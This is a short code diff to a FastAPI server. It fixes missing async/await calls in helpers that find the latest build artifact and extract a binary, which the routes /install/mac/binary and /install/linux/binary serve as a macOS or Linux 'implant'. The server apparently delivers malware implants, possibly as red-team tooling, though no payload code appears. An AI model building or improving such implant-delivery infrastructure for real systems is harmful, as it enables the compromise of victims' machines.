@@ -335,17 +335,17 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             return None
         return Path(art["path"])
 
-    def _latest_artifact(os_name: str) -> dict | None:
-        recent = run_in_threadpool(app.state.pipeline.recent, 300)
+    async def _latest_artifact(os_name: str) -> dict | None:
+        recent = await run_in_threadpool(app.state.pipeline.recent, 300)
         matches = [a for a in recent if str(a.get("os", "")) == os_name]
         if not matches:
             return None
         return max(matches, key=lambda a: float(a.get("ts", 0)))
 
-    def _extract_binary_from_archive(os_name: str) -> tuple[bytes, str] | None:
+    async def _extract_binary_from_archive(os_name: str) -> tuple[bytes, str] | None:
         """Extract the raw executable binary from a .command.zip (macOS) or
         .tar.gz (linux) artifact and return (bytes, filename)."""
-        art = _latest_artifact(os_name)
+        art = await _latest_artifact(os_name)
         if art is None:
             return None
         path = Path(art["path"])
@@ -384,7 +384,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
 
     @app.get("/install/mac/binary")
     async def install_mac_binary() -> Response:
-        result = _extract_binary_from_archive("darwin")
+        result = await _extract_binary_from_archive("darwin")
         if result is None:
             raise HTTPException(status_code=404, detail="no macOS implant built yet")
         data, filename = result
@@ -433,7 +433,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
 
     @app.get("/install/linux/binary")
     async def install_linux_binary() -> Response:
-        result = _extract_binary_from_archive("linux")
+        result = await _extract_binary_from_archive("linux")
         if result is None:
             raise HTTPException(status_code=404, detail="no Linux implant built yet")
         data, filename = result
